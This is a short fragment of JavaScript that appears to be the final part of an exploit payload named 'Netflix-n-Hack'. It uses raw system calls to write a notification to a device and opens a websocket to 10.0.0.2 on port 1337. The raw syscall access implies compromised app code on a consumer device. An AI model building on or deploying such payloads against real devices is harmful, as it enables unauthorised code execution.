            const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
            
            if (Number(fd) < 0) {
                return;
            }
            
            syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
            syscall(SYSCALL.close, fd);  
        }

        send_notification("Netflix-n-Hack ;)");

    } catch (e) {
        logger.log("EXCEPTION: " + e.message);
        logger.log(e.stack);
    }
}

ws.init("10.0.0.2", 1337, main);
